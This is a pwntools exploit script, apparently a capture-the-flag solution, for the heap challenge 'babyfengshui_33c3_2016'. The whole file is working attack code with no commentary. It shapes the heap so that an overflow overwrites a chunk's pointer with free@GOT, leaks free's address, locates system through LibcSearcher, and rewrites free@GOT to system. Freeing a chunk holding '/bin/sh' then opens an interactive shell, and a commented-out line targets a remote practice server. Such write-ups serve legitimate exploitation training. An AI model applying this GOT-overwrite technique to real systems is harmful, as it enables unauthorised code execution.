#coding:utf-8
from pwn import *
from LibcSearcher import *
import pwnlib
sh = process("./babyfengshui_33c3_2016")
# sh = remote("node3.buuoj.cn",28886)
elf = ELF("./babyfengshui_33c3_2016")

def add(size_name,name,size_text,text):
    sh.recvuntil("Action: ")
    sh.sendline("0")
    sh.recvuntil("size of description: ")
    sh.sendline(str(size_name)) 
    sh.recvuntil("name: ")
    sh.sendline(str(name))
    sh.recvuntil("text length: ")
    sh.sendline(str(size_text))
    sh.recvuntil("text: ")
    sh.sendline(str(text))

def dele(index):
    sh.recvuntil("Action: ")
    sh.sendline("1")
    sh.recvuntil("index: ")
    sh.sendline(str(index))

def show(index):
    sh.recvuntil("Action: ")
    sh.sendline("2")
    sh.recvuntil("index: ")
    sh.sendline(str(index))
def update(index,size_text,text):
    sh.recvuntil("Action: ")
    sh.sendline("3")
    sh.recvuntil("index: ")
    sh.sendline(str(index))
    sh.recvuntil("text length: ")
    sh.sendline(str(size_text))
    sh.recvuntil("text: ")
    sh.sendline(str(text))

def ts():
    gdb.attach(sh)
    pause()

free_got = elf.got['free']
add(0x80,"name1",0x80,"aaaa") #0
add(0x80,"name2",0x80,"bbbb") #1
add(0x80,"name3",0x80,"/bin/sh\x00") #2
dele(0) 
add(0x100,'name1',0x200,'dddd') #3
payload = 'a'*0x198+p32(free_got)
update(3,0x200,payload)
show(1)
sh.recvuntil("description: ")
free_addr = u32(sh.recv(4))
log.info("success leak free_addr:0x%x"%free_addr)
libc = LibcSearcher('free',free_addr)
libc_base = free_addr - libc.dump('free')
system_addr = libc_base + libc.dump('system')
log.info("success get system_addr:0x%x"%system_addr)
update(1,9,p32(system_addr))
ts()
dele(2)
sh.interactive()